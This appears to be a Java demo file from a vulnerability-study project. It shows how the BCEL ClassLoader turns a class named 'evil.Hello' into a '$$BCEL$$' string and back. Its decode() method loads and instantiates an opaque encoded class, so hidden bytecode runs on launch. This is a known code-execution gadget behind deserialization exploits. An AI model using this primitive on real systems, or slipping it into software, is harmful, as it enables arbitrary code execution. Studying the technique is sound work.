package com.govuln;

import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

public class HelloBCEL {
    public static void main(String []args) throws Exception {
        // encode();
        decode();
    }

    protected static void encode() throws Exception {
        JavaClass cls = Repository.lookupClass(evil.Hello.class);
        String code = Utility.encode(cls.getBytes(), true);
        System.out.println(code);
    }

    protected static void decode() throws Exception {
        new ClassLoader().loadClass("$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmP$cbN$CA$Q$ac$91$c7$$$cb$w$I$e2$fby0$B$P$ee$c5$h$c4$8b$89$f1$b0Q$T$M$9e$87e$82C$86$j$b3$M$q$7e$96$k4$f1$e0$H$f8Q$c6$9e$91$f8H$ecCW$ba$aa$ba$d23$ef$l$afo$AN$b0$X$a0$88$e5$Sj$a8$fbX$J$d0$c0$aa$875$P$eb$M$c5$8eL$a59e$c85$5b$3d$86$fc$99$k$I$86J$ySq9$j$f7Ev$c3$fb$8a$98Z$ac$T$aez$3c$93v$9e$93ys$t$t$Ma$yfRE$XB$v$ddf$f0$3b$89$9a$87$G$5d$3d$cd$Sq$$$ad$3bp$86$e3$R$9f$f1$Q$k$7c$P$h$n6$b1$c5Pv$ca$fe$ad$ce$d4$c0$c3v$88$j$ec$92$ff$t$95$a1j$d7$o$c5$d3at$d5$l$89$c4$fc$a1$ba$P$T$p$c6$f4$I$3d$r$a1$R$3bE$ea$e8$3a$93$a9$e9$9aL$f01$jV$ff$87f$f0$ee$ed$a4R$dak$c6$bf$o$N$d1$c3v$ab$87$D$U$e8$fbl$z$80$d9$c3$a9$97h$8a$I$Za$e1$e8$F$ec$d1$c9$B$f5$a2$ps$uS$P$bf$M$84$8b$84$3e$96$be$97$P$c9m$ab$f4$84$85Z$ee$Zy$h$c0$5c$40$e0$a4$CYmT$c5$FW$3f$B$dc$ab$c0$7f$cc$B$A$A").newInstance();
    }
}
